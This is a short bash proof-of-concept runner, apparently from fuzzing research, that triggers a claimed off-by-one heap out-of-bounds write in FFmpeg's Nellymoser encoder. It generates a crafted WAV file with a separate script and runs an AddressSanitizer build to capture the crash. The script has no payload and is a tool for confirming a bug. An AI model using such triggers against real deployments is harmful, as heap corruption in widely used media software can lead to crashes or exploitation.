#!/bin/bash
# PoC runner for VULN-001: get_exponent_dynamic off-by-one heap OOB write
# in FFmpeg nellymoserenc.c (libavcodec/nellymoserenc.c lines 260-278)
set -euo pipefail

cd "$(dirname "$0")"

BIN=/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg

echo "=== Generating crafted WAV input ==="
python3 vuln_001_gen.py

echo ""
echo "=== Running FFmpeg with Nellymoser encoder (trellis=1) ==="
echo "Command: $BIN -i vuln_001_input.wav -c:a nellymoser -trellis 1 -f flv /dev/null"
echo ""

ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" \
  "$BIN" -y -i vuln_001_input.wav \
         -c:a nellymoser \
         -trellis 1 \
         -ar 8000 \
         -f flv /dev/null 2>&1 || true

echo ""
echo "=== Checking for ASAN output ==="
if ls asan.log.* 1>/dev/null 2>&1; then
    cat asan.log.*
else
    echo "(No ASAN log files found — binary may not have been built with ASan)"
fi
